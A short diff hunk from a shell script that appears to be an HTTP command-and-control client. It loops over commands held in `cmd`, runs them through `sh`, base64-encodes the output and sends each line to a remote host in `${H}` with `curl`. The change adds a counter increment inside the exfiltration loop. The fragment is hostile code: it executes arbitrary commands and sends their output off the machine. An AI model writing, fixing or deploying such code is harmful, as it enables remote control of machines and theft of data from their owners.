@@ -9,6 +9,7 @@ while :; do
         fi
         echo "${cmd}" | sh | base64 | while read line; do
                 curl -s "${H}/r-$$-$i-$line"
+                i=$(( $i + 1 ))
         done
         i=$(( $i + 1 ))
 done
